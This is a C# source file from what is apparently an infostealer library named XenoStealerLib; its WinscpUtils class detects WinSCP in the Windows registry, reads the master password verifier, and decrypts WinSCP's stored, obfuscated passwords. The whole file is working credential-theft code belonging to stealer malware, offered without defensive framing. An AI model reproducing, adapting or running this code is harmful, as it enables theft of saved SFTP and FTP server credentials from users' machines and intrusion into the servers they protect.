using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib.Utils
{
    class WinscpUtils
    {
        public static bool Installed() 
        {
            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        using (RegistryKey OpenedKey = CurrentUserX.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"))
                        {
                            return true;
                        }
                    }
                }
                catch
                {

                }
            }
            return false;
        }
        public static string GetMasterPasswordVerifier() 
        {
            string MasterPasswordVerifier = null;
            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        using (RegistryKey OpenedKey = CurrentUserX.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"))
                        {
                            bool isMasterPassword = (int)OpenedKey.GetValue("UseMasterPassword") == 1;
                            if (isMasterPassword) 
                            {
                                MasterPasswordVerifier = OpenedKey.GetValue("MasterPasswordVerifier").ToString();
                                break;
                            }
                        }
                    }
                }
                catch
                {

                }
            }
            return MasterPasswordVerifier;
        }

        private static int DecryptNextChar(List<string> list)
        {
			int result = 255 ^ (((int.Parse(list[0]) << 4) + int.Parse(list[1]) ^ 163) & 255);
            list.RemoveRange(0, 2);
			return result;

        }

        public static string DecryptData(string EncryptedData) 
        {
            string result = "";
            try
            {
                List<string> Stage1Password = new List<string>();
                for (int i = 0; i < EncryptedData.Length; i++)
                {
                    if (EncryptedData[i] == 'A')
                    {
                        Stage1Password.Add("10");
                    }
                    else if (EncryptedData[i] == 'B')
                    {
                        Stage1Password.Add("11");
                    }
                    else if (EncryptedData[i] == 'C')
                    {
                        Stage1Password.Add("12");
                    }
                    else if (EncryptedData[i] == 'D')
                    {
                        Stage1Password.Add("13");
                    }
                    else if (EncryptedData[i] == 'E')
                    {
                        Stage1Password.Add("14");
                    }
                    else if (EncryptedData[i] == 'F')
                    {
                        Stage1Password.Add("15");
                    }
                    else
                    {
                        Stage1Password.Add(EncryptedData[i].ToString());
                    }
                }
                int dataLength;
                int flag = DecryptNextChar(Stage1Password);
                if (flag == 255)
                {
                    DecryptNextChar(Stage1Password);
                    dataLength = DecryptNextChar(Stage1Password);
                }
                else 
                {
                    dataLength = flag;
                }
                int GarbageLength = DecryptNextChar(Stage1Password) * 2;
                Stage1Password.RemoveRange(0, GarbageLength);
                for (int i = 0; i < dataLength; i++)
                {
                    result += (char)DecryptNextChar(Stage1Password);
                }
            }
            catch 
            {
                return null;
            }
            return result;
        }
    }
}
